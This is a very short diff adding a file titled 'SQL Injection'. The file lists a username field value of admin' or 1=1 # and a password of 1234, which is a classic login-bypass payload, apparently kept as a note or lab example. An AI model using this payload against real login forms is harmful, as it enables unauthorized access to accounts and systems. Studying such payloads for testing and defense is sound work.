@@ -1,0 +1,9 @@
+SQL Injection
+
+username : 
+admin' or 1=1 #
+
+password :
+1234
+
+
